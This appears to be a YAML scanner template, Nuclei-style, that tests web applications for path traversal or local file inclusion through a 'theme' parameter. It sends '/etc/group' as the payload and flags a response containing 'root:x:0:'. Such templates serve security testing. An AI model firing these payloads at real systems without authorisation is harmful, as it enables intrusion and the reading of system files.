id: lfi6-0159
name: 'Traversal in theme'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via theme'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      theme:
        - '/etc/group'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:'
